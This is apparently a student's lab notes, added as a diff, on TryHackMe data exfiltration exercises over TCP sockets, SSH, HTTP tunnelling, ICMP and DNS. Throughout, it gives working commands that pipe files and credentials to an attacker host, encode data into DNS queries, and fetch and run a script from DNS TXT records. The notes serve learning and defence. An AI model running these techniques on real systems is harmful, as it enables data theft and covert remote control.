@@ -1,0 +1,173 @@
+Data Exfiltration
+-steal and transfer sensitive data
+-relies on network protocols such as DNS, HTTP, SSH etc
+
+-----------------------------------------------------------
+
+connect
+ssh thm@[IP]
+password: tryhackme
+
+----------------------------------------------------------------
+
+-Data Exfiltration: unauthorized copy and export of data from inside an organization to the outside
+1. traditional: attacker -> server <-- firewall <-- data ( one direction_
+2. c2: establish a channel to send commands and receive responses from victim machine
+3. tunneling: establish communication channel b/n victim and attacker - continueous traffic
+
+-----------------------------------------------------------------------------
+
+Exfiltration using TCP Socket
+-easy to detect
+-encode data during transmission (harder to examine)
+
+ssh thm@[IP]
+tryhackme
+
+thm@jump-box nc -lvp 8080 > /tmp/task4-creds.data
+
+thm@jump-box ssh thm@vicitm1.thm.com
+tryhackme
+
+tar zcf -task4/ | base64 | dd conv=ebcdic > /dev/tcp[AttackIP]/8080
+
+thm@jump-box cd /tmp
+thm@jump-box /tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
+thm@jump-box tar xvf task4-creds.tar
+thm@jump-box cat task4/creds.txt
+
+*Exfiltration using TCP sockets relies on non-standard protocols
+
+-----------------------------------------------------------------------------------------
+
+Exfiltration using SSH
+-establishes a secure channel to interact and move data between client and server
+ssh thm@victim1.thm.com
+-pass: tryhackme
+cat task5/Creds.txt
+tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
+thm@jump-box$ cd /tmp/task5/
+thm@jump-box$ cat creds.txt
+
+---------------------------------------------------------------------------------------------
+
+Exfiltrate using HTTPS
+-need control of a webserver with server-side programming language
+-HTTP POST requests
+1. requests aren't cached
+2. don't remain in browser history
+3. can't be bookmarked
+4. no restriction on data length
+
+HTTP Tunneling
+-using Neo-reGeorg tool to establish communication channel to access internal network devices
+-tunneling server - on attacker machine
+-tunneling agent - uploaded to the compromised machine
+
+cd /opt/Neo-reGeorg
+python3 neoreg.py generate -k thm
+-use tunnel.php
+-upload to compromised machine
+-pass: admin
+python3 neoreg.py -k thm -u http://[IP]/uploader/files/tunnel.php
+-exfiltrate data
+curl --sock5 127.0.0.1:1080 http://[IP]/flag
+*THM{H77p_7unn3l1n9_l1k3_l337}
+
+-----------------------------------------------------------------------------------------------
+
+Exfiltration using ICMP
+-ICMP: internet control Message Protocol: network layer protocol used to handle error reporting
+-not a transport protocol
+-ICMP data section: can include strings or copies of other information (Optional data)
+-data included in optional data section and sent as an ICMP packet
+-use ping command
+ping [IP] -c 1
+-linux has optional -p argument specify 16 bytes of data in hex
+echo "thm:tryhackme" | xxd -p
+ping [IP] -c 1 -p 74686d3a7472796861636b6d650a
+-ICMP data exfiltration
+-look for Beginning of File(BOF) trigger value and End of File(EOF) trigger value
+-use metasploit framework
+msfconsole
+use auxiliary/server/icmp_exfil
+set BPF_FILTER icmp and not src [AttackBox IP]
+set INTERFACE eth0
+run
+-go to jump box
+ssh thm@icmp.thm.com
+sudo nping --icmp -c 1 [AttackBOx IP] --data-string "BOFfile.txt" 
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
+-attackbox
+-loot filename: /root/.msf4/loot/.....icmp_exfil_00000.txt
+
+ICMP C2 Communication
+thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
+thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121
+shell: getFlag
+thm@icmp-host:~$ cd /tmp
+thm@icmp-host:/tmp$ cat flag.txt
+*THM{g0t-1cmp-p4k3t!}
+
+------------------------------------------------------------------------------------------
+
+DNS Configuration
+-go to "https://[IP].p.thmlabs.com"
+-add attacker.thm.com 172.20.0.120
+-Type A
+-go to jumpbox
+ssh thm@[IP]
+dig +short test.thm.com
+dig +short flag.thm.com
+*172.20.0.120
+
+-----------------------------------------------------------------------------------------
+
+Exfiltration over DNS
+-DNS: protcol used to resolve domain names to IP addresses
+-can be used to exfiltrate data 
+-not usually monitored
+-max length of 255 characters
+-subdomain name not to exceed 63 characters
+-steps
+a. attacker registers a domain name (tunnel.com)
+b. point tunnel.com's NS record to a server that attacker controls
+c. attacker sends sensitive datat from vicitm machine to domain name 
+d. DNS request is sent through the local DNS server and is forwarded through the internet
+e. attacker's DNS receives DNS request
+f. attacker extracts data from domain name
+
+ssh thm@[IP]
+thm@jump-box$ ssh thm@attacker.thm.com
+thm@attacker$ sudo tcpdump -i eth0 udp port 53 -v 
+-another window
+thm@jump-box$ ssh thm@victim2.thm.com
+thm@victim2$ cat task9/credit.txt
+cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
+-previous window
+echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
+
+C2 Comms over DNS
+-bash script over DNS protocol
+thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
+flag*THM{C-tw0-C0mmun1c4t10ns-0v3r-DNS}
+
+---------------------------------------------------------------------------------------------------------------------------------------
+
+DNS Tunneling
+-TCP over DNS
+-attacker enapsulates other protocols over the DNS protocol using DNS data exfiltration technique
+-data is sent and received continuously
+-use iodine tool for creating DNS tunnel
+ssh thm@[IP]
+thm@jump-box:~$ ssh thm@attacker.thm.com
+thm@attacker:~$ sudo iodined -f -c -P password 10.1.1.1/24 att.tunnel.com
+thm@jump-box:~$ ssh thm@attacker.thm.com
+thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com
+thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com  
+root@attacker$ ssh thm@10.1.1.2 -4 -f -N -D 1080
+root@attacker$ curl --socks5 127.0.0.1:1080 http://[IP]/test.php
+flag: THM{DN5-Tunn311n9-1s-c00l}
+
